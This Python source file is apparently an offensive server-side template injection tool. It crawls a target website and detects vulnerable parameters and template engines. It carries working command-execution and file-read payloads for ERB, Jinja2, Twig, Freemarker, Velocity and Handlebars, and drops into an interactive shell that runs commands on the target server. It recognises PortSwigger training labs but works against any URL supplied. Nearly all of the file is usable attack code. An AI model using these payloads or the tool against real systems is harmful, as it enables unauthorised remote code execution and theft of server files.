"""
Server-Side Template Injection (SSTI) Detection and Exploitation Tool
Author: Cyto0x
Version: 3.0
"""
import requests
import re
import argparse
import html
import urllib3
import json
import csv
from datetime import datetime
from urllib3.exceptions import InsecureRequestWarning
from urllib.parse import urlparse, urljoin, parse_qs
from bs4 import BeautifulSoup
from base_scenario import BaseLabScenario
from concurrent.futures import ThreadPoolExecutor, as_completed
from scenario2 import Scenario2
from scenario3 import Scenario3
from scenario5 import Scenario5
from scenario6 import Scenario6


# Disable SSL/TLS warnings for proxy debugging
urllib3.disable_warnings(InsecureRequestWarning)

# ANSI Color Codes
COLOR_RED = "\033[91m"
COLOR_GREEN = "\033[92m"
COLOR_YELLOW = "\033[93m"
COLOR_BLUE = "\033[94m"
COLOR_MAGENTA = "\033[95m"
COLOR_CYAN = "\033[96m"
COLOR_WHITE = "\033[97m"
COLOR_RESET = "\033[0m"
COLOR_BOLD = "\033[1m"
COLOR_UNDERLINE = "\033[4m"

# ASCII Art Banner
BANNER = f"""
{COLOR_RED}{COLOR_BOLD}
████████╗██╗███╗   ██╗     ██╗
╚══██╔══╝██║████╗  ██║     ██║
   ██║   ██║██╔██╗ ██║     ██║
   ██║   ██║██║╚██╗██║██   ██║
   ██║   ██║██║ ╚████║╚█████╔╝
   ╚═╝   ╚═╝╚═╝  ╚═══╝ ╚════╝ 
{COLOR_RESET}{COLOR_CYAN}
Server-Side Template Injection Toolkit
{COLOR_YELLOW}>> Version: 3.0 | By: Cyto0x <<{COLOR_RESET}
"""

# Configuration Constants
UNIQUE_PREFIX = "TINJ_"  # Template INJection marker prefix
REQUEST_TIMEOUT = 15     # Timeout for HTTP requests in seconds

class LabHandler:
    """Detects and handles PortSwigger lab scenarios"""
    
    LAB_IDENTIFIERS = {
        r"Basic server-side template injection \(code context\)": Scenario2,
        r"Server-side template injection using documentation": Scenario3,
        r"Server-side template injection with information disclosure via user-supplied objects": Scenario5,
        r"Server-side template injection in a sandboxed environment": Scenario6,

        # Add other lab patterns and classes here
        # "Server-side template injection using documentation": Scenario3,
        
        # "Server-side template injection with information disclosure via user-supplied objects": Scenario5,
        # "Server-side template injection in a sandboxed environment": Scenario6
    }   

    def __init__(self, session):
        self.session = session  # Use parent session with proxy config
        self.detected_lab = None

    def detect_lab(self, response_text):
        """Check if response contains known lab identifiers"""
        for pattern, lab_class in self.LAB_IDENTIFIERS.items():
            if re.search(pattern, response_text, re.IGNORECASE):
                self.detected_lab = lab_class
                return True
        return False

    def execute_lab_exploit(self, url):
        """Run the appropriate lab exploit if detected"""
        if not self.detected_lab:
            return False

        ColorPrinter.info(f"Detected PortSwigger lab: {self.detected_lab.__name__}")
        lab_instance = self.detected_lab(url, self.session)  # Pass the existing session
        # Rest of the method remains the same
        
        try:
            if lab_instance.exploit():
                ColorPrinter.success("Lab exploitation successful!")
                # Automatically start shell without prompting
                lab_instance.interactive_shell()
                return True
        except Exception as e:
            ColorPrinter.error(f"Lab exploitation failed: {str(e)}")
        
        return False

class SiteCrawler:
    """Discovers potential parameters by crawling the target website"""
    
    def __init__(self, session, max_depth=2):
        """
        Initialize crawler with session and configuration
        
        Args:
            session: requests.Session object
            max_depth: Maximum recursion depth for crawling
        """
        self.session = session
        self.max_depth = max_depth
        self.visited_urls = set()
        self.discovered_params = set()
        self.base_domain = ""
        self.test_value = "TINJ_REFLECTION_TEST"  # Unique test string

    def _is_same_domain(self, url):
        """Check if URL belongs to the target domain"""
        return urlparse(url).netloc == self.base_domain

    def _extract_params_from_url(self, url):
        """Extract unique parameters from URL"""
        query = urlparse(url).query
        return set(parse_qs(query).keys())  # Returns unique parameter names

    def _extract_params_from_form(self, soup):
        """Extract parameters from HTML forms"""
        params = set()
        for form in soup.find_all('form'):
            for input_tag in form.find_all('input'):
                if input_tag.get('name'):
                    params.add(input_tag['name'])
        return params
    
    def _extract_params_from_headers(self, response):
        """Extract parameters from redirect headers"""
        params = set()
        if 300 <= response.status_code < 400:
            location = response.headers.get('Location', '')
            parsed = urlparse(location)
            params.update(parse_qs(parsed.query).keys())
        return params
    

    def crawl(self, start_url):
        """
        Main crawling workflow
        
        Args:
            start_url: URL to start crawling from
            
        Returns:
            Set of discovered parameters
        """
        self.base_domain = urlparse(start_url).netloc
        self._crawl_recursive(start_url, depth=0)
        return self.discovered_params

    def _crawl_recursive(self, url, depth):
        if depth > self.max_depth or url in self.visited_urls:
            return

        try:
            response = self.session.get(url, timeout=REQUEST_TIMEOUT, verify=False, 
                                       allow_redirects=False)  # Handle redirects manually
            
            self.visited_urls.add(url)
            
            # 1. Extract parameters from redirect location
            if 300 <= response.status_code < 400:
                location = response.headers.get('Location', '')
                if location:
                    parsed = urlparse(location)
                    self.discovered_params.update(parse_qs(parsed.query).keys())
                    # Follow redirect but don't count towards depth
                    next_url = urljoin(url, location)
                    self._crawl_recursive(next_url, depth)
            
            # 2. Process normal responses
            if response.status_code == 200:
                # Extract from URL and forms
                self.discovered_params.update(self._extract_params_from_url(url))
                soup = BeautifulSoup(response.text, 'html.parser')
                self.discovered_params.update(self._extract_params_from_form(soup))
                
                # Crawl links
                if depth < self.max_depth:
                    for link in soup.find_all('a', href=True):
                        next_url = urljoin(url, link['href'])
                        if urlparse(next_url).netloc == self.base_domain:
                            self._crawl_recursive(next_url, depth + 1)

        except Exception as e:
            ColorPrinter.error(f"Crawling error at {url}: {str(e)}")




# Template engine payload database
EXPLOIT_PAYLOADS = {
    "ERB": {
        "exec": f"{UNIQUE_PREFIX}START<%= `COMMAND` %>TINJ_END",
        "read": f"{UNIQUE_PREFIX}START<%= File.read('FILE') %>TINJ_END",
    },
    "Jinja2": {
        "exec": f"{UNIQUE_PREFIX}START{{ self.__init__.__globals__.__builtins__.__import__('os').popen('COMMAND').read() }}TINJ_END",
        "read": f"{UNIQUE_PREFIX}START{{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['open']('FILE').read() }}TINJ_END",
    },
    "Twig": {
        "exec": f"{UNIQUE_PREFIX}START{{ _self.env.registerUndefinedFilterCallback('exec') }}{{ _self.env.getFilter('COMMAND') }}TINJ_END",
        "read": f"{UNIQUE_PREFIX}START{{ _self.env.registerUndefinedFilterCallback('system') }}{{ _self.env.getFilter('cat FILE') }}TINJ_END"
    },
    "Freemarker": {
        "exec": f"{UNIQUE_PREFIX}START<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${{ ex(\"COMMAND\") }}TINJ_END",
        "read": f"{UNIQUE_PREFIX}START${{product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve(\"FILE\").toURL().openStream().readAllBytes()?join(\" \")}}TINJ_END"
    },
    "Velocity": {
        "exec": f"{UNIQUE_PREFIX}START#set($str=$class.inspect(\"java.lang.String\").type)#set($chr=$class.inspect(\"java.lang.Character\").type)#set($ex=$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"COMMAND\"))TINJ_END",
        "read": f"{UNIQUE_PREFIX}START#set($str=$class.inspect(\"java.lang.String\").type)#set($chr=$class.inspect(\"java.lang.Character\").type)#set($is=$class.inspect(\"java.io.InputStream\").type)#set($fis=$class.inspect(\"java.io.FileInputStream\").type.getConstructor($str).newInstance(\"FILE\"))TINJ_END"
    },
    "Handlebars": {
        "exec": f"""{UNIQUE_PREFIX}START{{{{#with "s" as |string|}}}}
  {{{{#with "e"}}}}
    {{{{#with split as |conslist|}}}}
      {{{{this.pop}}}}
      {{{{this.push (lookup string.sub "constructor")}}}}
      {{{{this.pop}}}}
      {{{{#with string.split as |codelist|}}}}
        {{{{this.pop}}}}
        {{{{this.push "return require('child_process').execSync('COMMAND').toString();"}}}}
        {{{{this.pop}}}}
        {{{{#each conslist}}}}
          {{{{#with (string.sub.apply 0 codelist)}}}}
            {{{{this}}}}
          {{{{/with}}}}
        {{{{/each}}}}
      {{{{/with}}}}
    {{{{/with}}}}
  {{{{/with}}}}
{{{{/with}}}}TINJ_END""",
        "read": f"""{UNIQUE_PREFIX}START{{{{#with "s" as |string|}}}}
  {{{{#with "e"}}}}
    {{{{#with split as |conslist|}}}}
      {{{{this.pop}}}}
      {{{{this.push (lookup string.sub "constructor")}}}}
      {{{{this.pop}}}}
      {{{{#with string.split as |codelist|}}}}
        {{{{this.pop}}}}
        {{{{this.push "return require('fs').readFileSync('FILE', 'utf8');"}}}}
        {{{{this.pop}}}}
        {{{{#each conslist}}}}
          {{{{#with (string.sub.apply 0 codelist)}}}}
            {{{{this}}}}
          {{{{/with}}}}
        {{{{/each}}}}
      {{{{/with}}}}
    {{{{/with}}}}
  {{{{/with}}}}
{{{{/with}}}}TINJ_END"""
    }

}

class ColorPrinter:
    """Handles colorized output formatting"""
    
    @staticmethod
    def print_banner():
        """Display the ASCII art banner"""
        print(BANNER)
        
    @staticmethod
    def success(msg):
        print(f"{COLOR_GREEN}[+] {msg}{COLOR_RESET}")
        
    @staticmethod
    def warning(msg):
        print(f"{COLOR_YELLOW}[!] {msg}{COLOR_RESET}")
        
    @staticmethod
    def error(msg):
        print(f"{COLOR_RED}[-] {msg}{COLOR_RESET}")
        
    @staticmethod
    def info(msg):
        print(f"{COLOR_CYAN}[*] {msg}{COLOR_RESET}")
        
    @staticmethod
    def verbose(msg, title="DEBUG"):
        print(f"{COLOR_MAGENTA}[~] {title}: {msg}{COLOR_RESET}")

class ErrorBasedEngineDetector:
    """Detects template engines through error message analysis"""
    
    def __init__(self, session):
        """
        Initialize detector with common error-inducing payload
        
        Args:
            session: requests.Session object for HTTP communication
        """
        self.session = session
        self.error_payload = "${{<%[%'\"}}%\\"  # Malformed template payload
        self.engine_patterns = {
            "Jinja2": r"jinja2",
            "Twig": r"twig",
            "Django": r"django",
            "Freemarker": r"freemarker|freeMarker",
            "ERB": r"erb|Erb",
            "Handlebars": r"handlebars",
            "Velocity": r"velocity"
        }

    def detect(self, url, params):
        """
        Scan for template engines through error responses
        
        Args:
            url: Target URL to test
            params: List of parameters to test
            
        Returns:
            Dictionary containing vulnerability details or None
        """
        for param in params:
            try:
                response = self.session.get(
                    url,
                    params={param: self.error_payload},
                    timeout=REQUEST_TIMEOUT,
                    verify=False
                )
                
                if response.status_code == 500:
                    for engine, pattern in self.engine_patterns.items():
                        if re.search(pattern, response.text, re.IGNORECASE):
                            return {
                                "parameter": param,
                                "engine": engine,
                                "method": "error-based",
                                "evidence": f"Error message contains '{engine}'"
                            }
            except requests.exceptions.RequestException as e:
                ColorPrinter.error(f"Request failed for parameter {param}: {str(e)}")
                continue
        return None

class EvaluationBasedEngineDetector:
    """Identifies template engines through mathematical evaluation"""
    
    def __init__(self, session):
        """
        Initialize detector with engine-specific payloads
        
        Args:
            session: requests.Session object for HTTP communication
        """
        self.session = session
        self.payload_map = {
            "ERB": {
                "payload": f"{UNIQUE_PREFIX}ERB<%= 7*7 %>",
                "expected": f"{UNIQUE_PREFIX}ERB49"
            },
            "Jinja2": {
                "payload": f"{UNIQUE_PREFIX}JINJA{{7*'7'}}",
                "expected": f"{UNIQUE_PREFIX}JINJA7777777"
            },
            "Twig": {
                "payload": f"{UNIQUE_PREFIX}TWIG{{7*7}}",
                "expected": f"{UNIQUE_PREFIX}TWIG49"
            },
            "Freemarker": {
                "payload": f"{UNIQUE_PREFIX}FREEMARKER${{7*7}}",
                "expected": f"{UNIQUE_PREFIX}FREEMARKER49"
            },
            "Handlebars": {
                "payload": f"{UNIQUE_PREFIX}HANDLE{{7*7}}",
                "expected": f"{UNIQUE_PREFIX}HANDLE49"
            },
            "Velocity": {
                "payload": f"{UNIQUE_PREFIX}VELO#set($x=7*7)${{x}}",
                "expected": f"{UNIQUE_PREFIX}VELO49"
            }
        }

    def detect(self, url, params):
        """
        Execute evaluation-based detection workflow
        
        Args:
            url: Target URL to test
            params: List of parameters to test
            
        Returns:
            Dictionary containing vulnerability details or None
        """
        for param in params:
            for engine, data in self.payload_map.items():
                try:
                    response = self.session.get(
                        url,
                        params={param: data["payload"]},
                        timeout=REQUEST_TIMEOUT,
                        verify=False
                    )
                    
                    if data["expected"] in response.text:
                        return {
                            "parameter": param,
                            "engine": engine,
                            "method": "evaluation-based",
                            "evidence": f"Matched: {data['expected']}"
                        }
                except requests.exceptions.RequestException as e:
                    ColorPrinter.error(f"Detection failed for {engine}: {str(e)}")
                    continue
        return None

class SSTIScanner:
    """Main scanner class coordinating detection workflows"""
    
    def __init__(self, proxies=None, threads=10):
        self.session = requests.Session()
        self.session.trust_env = False  # Critical fix: Disable env proxies
        self.reflection_test_value = "TINJ_REFL_7BxY9z"  # More unique value
        self.verification_value = "TINJ_VERIF_4QwP2m"    # Different verification string

        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) TINJ-Scanner/2.0"
        })
        
        # Configure proxies properly
        if proxies:
            valid_protocols = ['http', 'https']
            formatted_proxies = {}
            
            # Normalize proxy format
            for proto in valid_protocols:
                if proto in proxies:
                    proxy = proxies[proto]
                    if not proxy.startswith(('http://', 'https://')):
                        proxy = f"http://{proxy}"
                    formatted_proxies[proto] = proxy
                    
            if formatted_proxies:
                self.session.proxies.update(formatted_proxies)
                self.session.verify = False
                ColorPrinter.info(f"Proxy configured: {formatted_proxies}")

        self.threads = threads
        self.report_data = {
            "target": "",
            "timestamp": "",
            "findings": []
        }
        self.lab_handler = LabHandler(self.session)
        self.crawl_depth = 3  # Set default crawl depth


    def _exact_match_in_body(self, response, test_value):
        """Check for exact value presence in response body"""
        try:
            # Use regex with word boundaries for exact match
            pattern = re.compile(r'\b' + re.escape(test_value) + r'\b')
            return bool(pattern.search(response.text))
        except Exception as e:
            ColorPrinter.error(f"Match error: {str(e)}")
            return False

   

    def scan(self, target_url, parameters):
        # Crawl first
        ColorPrinter.info("Starting website crawling...")
        crawler = SiteCrawler(self.session, self.crawl_depth)
        crawled_params = crawler.crawl(target_url)
        all_params = list(set(parameters + list(crawled_params)))
        ColorPrinter.success(f"Discovered {len(all_params)} parameters through crawling")
        
        # Test reflection
        reflected_params = self.find_reflected_parameters(target_url, all_params)
        ColorPrinter.success(f"Found {len(reflected_params)} reflected parameters")
        
        if not reflected_params:
            ColorPrinter.error("No reflected parameters found - stopping scan")
            return None
            
        # Only test reflected parameters for SSTI
        findings = []
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self.test_parameter, target_url, param): param 
                      for param in reflected_params}
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    findings.append(result)
                    self._print_vulnerability(result)
        
        if findings:
            for finding in findings:
                self.report_data["findings"].append({
                    "url": target_url,
                    "parameter": finding["parameter"],
                    "engine": finding["engine"],
                    "method": finding["method"],
                    "evidence": finding["evidence"],
                    "timestamp": datetime.now().isoformat()
                })
            return findings[0]  # Return first vulnerability for exploitation
        
        ColorPrinter.error("No template injection vulnerabilities detected")
        return None

    def find_reflected_parameters(self, target_url, parameters):
        """Find parameters with verified body reflection"""
        ColorPrinter.info(f"Strict reflection testing for {len(parameters)} parameters...")
        
        reflected_params = []
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_param = {
                executor.submit(self.test_parameter_reflection, target_url, param): param
                for param in parameters
            }
            
            for future in as_completed(future_to_param):
                param = future_to_param[future]
                try:
                    if future.result():
                        reflected_params.append(param)
                        ColorPrinter.info(f"Verified reflection in: {param}")
                except Exception as e:
                    continue
                    
        return reflected_params


    def test_parameter_reflection(self, url, param):
        """Strict reflection test for response body only"""
        try:
            # Initial test
            test_response = self.session.get(
                url,
                params={param: self.reflection_test_value},
                allow_redirects=True,
                timeout=REQUEST_TIMEOUT,
                verify=False
            )
            
            # Verification test
            verify_response = self.session.get(
                url,
                params={param: self.verification_value},
                allow_redirects=True,
                timeout=REQUEST_TIMEOUT,
                verify=False
            )

            # Both tests must pass
            return (
                self._exact_match_in_body(test_response, self.reflection_test_value) and 
                self._exact_match_in_body(verify_response, self.verification_value)
            )
            
        except Exception as e:
            ColorPrinter.info(f"Reflection test failed for {param}: {str(e)}")
            return False
    
    def test_reflection(self, url, params):
        """Test parameters for value reflection"""
        reflected_params = []
        
        for param in params:
            try:
                test_payload = f"{self.test_value}_{param}"
                response = self.session.get(
                    url,
                    params={param: test_payload},
                    timeout=REQUEST_TIMEOUT,
                    verify=False,
                    allow_redirects=True  # Follow redirects for reflection check
                )
                
                # Check reflection in both body and URL
                if (test_payload in response.text or 
                    test_payload in response.url or
                    any(test_payload in header for header in response.headers.values())):
                    reflected_params.append(param)
                    ColorPrinter.info(f"Reflection found in parameter: {param}")
                
            except Exception as e:
                ColorPrinter.error(f"Reflection test failed for {param}: {str(e)}")
        
        return reflected_params
    
    def verify_reflection(self, url, param, verification_value):
        """Confirm reflection with different value"""
        try:
            response = self.session.get(
                url,
                params={param: verification_value},
                allow_redirects=True,
                timeout=REQUEST_TIMEOUT,
                verify=False
            )
            
            # Check for presence of verification value
            return (
                verification_value in response.text or
                verification_value in response.url or
                any(verification_value in header for header in response.headers.values())
            )
            
        except Exception as e:
            ColorPrinter.error(f"Verification failed for {param}: {str(e)}")
            return False
    
    def test_parameter(self, url, param):
        # Error-based detection
        error_detector = ErrorBasedEngineDetector(self.session)
        error_result = error_detector.detect(url, [param])
        if error_result:
            return error_result
        
        # Evaluation-based detection
        eval_detector = EvaluationBasedEngineDetector(self.session)
        eval_result = eval_detector.detect(url, [param])
        return eval_result
    
    def _print_vulnerability(self, result):
        """Print vulnerability details with color formatting"""
        ColorPrinter.success("\n=== SSTI Vulnerability Found ===")
        print(f"{COLOR_CYAN}Parameter: {COLOR_WHITE}{result['parameter']}")
        print(f"{COLOR_CYAN}Engine:    {COLOR_WHITE}{result['engine']}")
        print(f"{COLOR_CYAN}Method:    {COLOR_WHITE}{result['method']}")
        print(f"{COLOR_CYAN}Evidence:  {COLOR_WHITE}{result['evidence']}")
        ColorPrinter.success("===============================\n")

    def generate_report(self, format="json", filename=None):
        """Generate output reports in specified format"""
        if not filename or not self.report_data["findings"]:
            return
            
        try:
            if format == "json":
                with open(filename, 'w') as f:
                    json.dump(self.report_data, f, indent=2)
            elif format == "csv":
                with open(filename, 'w', newline='', encoding='utf-8') as f:
                    writer = csv.writer(f)
                    writer.writerow(["URL", "Parameter", "Engine", "Method", "Evidence", "Timestamp"])
                    for finding in self.report_data["findings"]:
                        writer.writerow([
                            finding["url"],
                            finding["parameter"],
                            finding["engine"],
                            finding["method"],
                            finding["evidence"],
                            finding["timestamp"]
                        ])
            elif format == "xml":
                import xml.etree.ElementTree as ET
                root = ET.Element("SSTIFindings")
                ET.SubElement(root, "Target").text = self.report_data["target"]
                ET.SubElement(root, "Timestamp").text = self.report_data["timestamp"]
                
                findings = ET.SubElement(root, "Findings")
                for finding in self.report_data["findings"]:
                    vuln = ET.SubElement(findings, "Vulnerability")
                    ET.SubElement(vuln, "URL").text = finding["url"]
                    ET.SubElement(vuln, "Parameter").text = finding["parameter"]
                    ET.SubElement(vuln, "Engine").text = finding["engine"]
                    ET.SubElement(vuln, "Method").text = finding["method"]
                    ET.SubElement(vuln, "Evidence").text = finding["evidence"]
                    ET.SubElement(vuln, "Timestamp").text = finding["timestamp"]
                
                tree = ET.ElementTree(root)
                tree.write(filename, encoding='utf-8', xml_declaration=True)
            
            ColorPrinter.success(f"Report generated: {filename}")
        except Exception as e:
            ColorPrinter.error(f"Failed to generate report: {str(e)}")

class SSTIExploiter:
    """Exploitation handler for confirmed vulnerabilities"""
    
    def __init__(self, session, base_url, vulnerable_param, engine):
        """
        Initialize exploiter with target details
        
        Args:
            session: Established requests session
            base_url: Vulnerable endpoint URL
            vulnerable_param: Confirmed vulnerable parameter
            engine: Detected template engine
        """
        self.session = session
        self.base_url = base_url
        self.param = vulnerable_param
        self.engine = engine
        self.payloads = EXPLOIT_PAYLOADS.get(engine, {})

    def execute_command(self, command):
        """
        Generate and execute command injection payload
        
        Args:
            command: System command to execute
            
        Returns:
            Command output or None
        """
        if not self.payloads.get("exec"):
            ColorPrinter.error(f"Execution not supported for {self.engine}")
            return None
            
        payload = self.payloads["exec"].replace("COMMAND", command)
        return self._send_payload(payload)

    def read_file(self, filename):
        """
        Generate and execute file read payload
        
        Args:
            filename: Path to file to read
            
        Returns:
            File contents or None
        """
        if not self.payloads.get("read"):
            ColorPrinter.error(f"File read not supported for {self.engine}")
            return None
            
        payload = self.payloads["read"].replace("FILE", filename)
        return self._send_payload(payload)

    def _send_payload(self, payload):
        """
        Execute payload and process response
        
        Args:
            payload: Fully constructed exploit payload
            
        Returns:
            Cleaned response text or None
        """
        try:
            response = self.session.get(
                self.base_url,
                params={self.param: payload},
                timeout=REQUEST_TIMEOUT,
                verify=False
            )
            return self._clean_response(response.text)
        except Exception as e:
            ColorPrinter.error(f"Payload delivery failed: {str(e)}")
            return None
        
    def _clean_response(self, text):
        """
        Extract and clean response between markers
        
        Args:
            text: Raw response text
            
        Returns:
            Cleaned command output or default message
        """
        # Find content between markers
        match = re.search(r'TINJ_START(.*?)TINJ_END', text, re.DOTALL)
        if not match:
            return "No output captured between markers"
        
        # Extract and clean the content
        captured = match.group(1)
        
        # Remove template artifacts and empty lines
        cleaned_lines = []
        for line in captured.split('\n'):
            # Filter out Handlebars artifacts and empty lines
            line = line.strip()
            if not line:
                continue
            if any(x in line for x in ["[object Object]", "function Function()"]):
                continue
                
            cleaned_lines.append(line)
        
        # Reconstruct with proper newlines and HTML unescape
        final_output = html.unescape('\n'.join(cleaned_lines))
        
        # Remove numeric prefixes from payload execution chain
        final_output = re.sub(r'^\d+\s*', '', final_output, flags=re.MULTILINE)
        
        return final_output or "Command executed but no output captured"

def interactive_shell(exploiter):
    """
    Provide interactive command execution interface
    
    Args:
        exploiter: Initialized SSTIExploiter instance
    """
    ColorPrinter.success(f"\n[+] Entering {exploiter.engine} exploitation shell")
    ColorPrinter.warning("[!] Type 'exit' to quit")
    ColorPrinter.warning("[!] Commands will be executed on the target server\n")
    
    while True:
        try:
            cmd = input(f"{COLOR_RED}tinj-shell{COLOR_RESET}{COLOR_WHITE}» {COLOR_RESET}").strip()
            if not cmd:
                continue
            if cmd.lower() == "exit":
                break
                
            if cmd.startswith("read "):
                _, filename = cmd.split(" ", 1)
                result = exploiter.read_file(filename)
            else:
                result = exploiter.execute_command(cmd)
                
            if result:
                # print(f"\n{COLOR_BLUE}=== COMMAND OUTPUT ==={COLOR_RESET}")
                print(f"{COLOR_WHITE}{result}{COLOR_RESET}")
                # print(f"{COLOR_BLUE}======================{COLOR_RESET}\n")
            else:
                ColorPrinter.error("No response received from server")
                
        except KeyboardInterrupt:
            ColorPrinter.error("\n[-] Terminating session...")
            break
        except Exception as e:
            ColorPrinter.error(f"Execution error: {str(e)}")

if __name__ == "__main__":
    ColorPrinter.print_banner()

    # Command-line interface configuration
    parser = argparse.ArgumentParser(
        description='TINJ - Template INJection Scanner',
        formatter_class=argparse.RawTextHelpFormatter,
        add_help=False,
        epilog=f'''{COLOR_CYAN}
Usage Examples:
  Single URL scan:
    python SSTI.py -u https://vuln-site.com -o report.xml --format xml
  
  Multiple URLs from file:
    python SSTI.py -uf targets.txt -o report.csv --format csv
{COLOR_RESET}'''
    )
    # Required arguments
    # Required arguments group
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-u', '--url', help='Single target URL to scan')
    group.add_argument('-uf', '--url-file', help='File containing multiple URLs to scan')

    # Optional arguments
    parser.add_argument('-o', '--output', help='Output file for report')
    parser.add_argument('-f', '--format', 
                      choices=['json', 'csv', 'xml'], 
                      default='json',
                      type=str.lower,
                      help='Report format (default: json)')
    parser.add_argument('--proxy', help='Proxy server (ip:port)')
    parser.add_argument('--params', 
                      default="email,username,name,search,q,input,id",
                      help='Parameters to test (comma-separated)')
    parser.add_argument('--threads', 
                      type=int, 
                      default=10,
                      help='Number of concurrent threads (default: 10)')
    parser.add_argument('-h', '--help', 
                      action='help',
                      default=argparse.SUPPRESS,
                      help='Show this help message and exit')

    args = parser.parse_args()

    # Validate input
    if not args.url and not args.url_file:
        ColorPrinter.error("Please specify either --url or --url-file")
        exit(1)
        
    urls = []
    if args.url:
        urls.append(args.url.strip())
    if args.url_file:
        try:
            with open(args.url_file, 'r') as f:
                urls.extend([line.strip() for line in f if line.strip()])
        except Exception as e:
            ColorPrinter.error(f"Error reading URL file: {str(e)}")
            exit(1)
    
    # Format proxies correctly
    proxies = {}
    if args.proxy:
        proxy = args.proxy
        if not proxy.startswith(('http://', 'https://')):
            proxy = f"http://{proxy}"
        proxies = {'http': proxy, 'https': proxy}

    scanner = SSTIScanner(
        proxies=proxies,
        threads=args.threads    
    )

    all_findings = []
    
    for url in urls:
        try:
            ColorPrinter.info(f"\nScanning URL: {url}")
            scanner = SSTIScanner(
                proxies=proxies,
                threads=args.threads
            )

            initial_response = scanner.session.get(url, verify=False)
            result = None
            
            if scanner.lab_handler.detect_lab(initial_response.text):
                if not scanner.lab_handler.execute_lab_exploit(url):
                    parameters = [p.strip() for p in args.params.split(',')]
                    result = scanner.scan(url, parameters)
            else:
                parameters = [p.strip() for p in args.params.split(',')]
                result = scanner.scan(url, parameters)
            
            if result:
                all_findings.append({
                    "url": url,
                    "parameter": result["parameter"],
                    "engine": result["engine"],
                    "method": result["method"],
                    "evidence": result["evidence"],
                    "timestamp": datetime.now().isoformat()
                })
                
                exploiter = SSTIExploiter(
                    scanner.session,
                    url,
                    result['parameter'],
                    result['engine']
                )
                interactive_shell(exploiter)
                
        except Exception as e:
            ColorPrinter.error(f"Error scanning {url}: {str(e)}")
            continue

        # Generate final report
    if all_findings:
        report_data = {
            "target": args.url if args.url else args.url_file,
            "timestamp": datetime.now().isoformat(),
            "findings": all_findings
        }
        
        if args.output:
            try:
                if args.format == "json":
                    with open(args.output, 'w') as f:
                        json.dump(report_data, f, indent=2)
                elif args.format == "csv":
                    with open(args.output, 'w', newline='', encoding='utf-8') as f:
                        writer = csv.writer(f)
                        writer.writerow(["URL", "Parameter", "Engine", "Method", "Evidence", "Timestamp"])
                        for finding in report_data["findings"]:
                            writer.writerow([
                                finding["url"],
                                finding["parameter"],
                                finding["engine"],
                                finding["method"],
                                finding["evidence"],
                                finding["timestamp"]
                            ])
                elif args.format == "xml":
                    import xml.etree.ElementTree as ET
                    root = ET.Element("SSTIFindings")
                    ET.SubElement(root, "Target").text = report_data["target"]
                    ET.SubElement(root, "Timestamp").text = report_data["timestamp"]
                    
                    findings = ET.SubElement(root, "Findings")
                    for finding in report_data["findings"]:
                        vuln = ET.SubElement(findings, "Vulnerability")
                        ET.SubElement(vuln, "URL").text = finding["url"]
                        ET.SubElement(vuln, "Parameter").text = finding["parameter"]
                        ET.SubElement(vuln, "Engine").text = finding["engine"]
                        ET.SubElement(vuln, "Method").text = finding["method"]
                        ET.SubElement(vuln, "Evidence").text = finding["evidence"]
                        ET.SubElement(vuln, "Timestamp").text = finding["timestamp"]
                    
                    tree = ET.ElementTree(root)
                    tree.write(args.output, encoding='utf-8', xml_declaration=True)
                
                ColorPrinter.success(f"Report generated: {args.output}")
            except Exception as e:
                ColorPrinter.error(f"Failed to generate report: {str(e)}")
    
    try:
        initial_response = scanner.session.get(args.url, verify=False)
        if scanner.lab_handler.detect_lab(initial_response.text):
            if not scanner.lab_handler.execute_lab_exploit(args.url):
                # If lab exploit fails, proceed with normal scan
                parameters = [p.strip() for p in args.params.split(',')]
                result = scanner.scan(args.url, parameters)
        else:
            parameters = [p.strip() for p in args.params.split(',')]
            result = scanner.scan(args.url, parameters)
            
        if result:
            exploiter = SSTIExploiter(
                scanner.session,
                args.url,
                result['parameter'],
                result['engine']
            )
            interactive_shell(exploiter)
            
        if args.output:
            scanner.generate_report(format=args.format, filename=args.output)
            
    except Exception as e:
        ColorPrinter.error(f"Scanning failed: {str(e)}")
        exit(1)
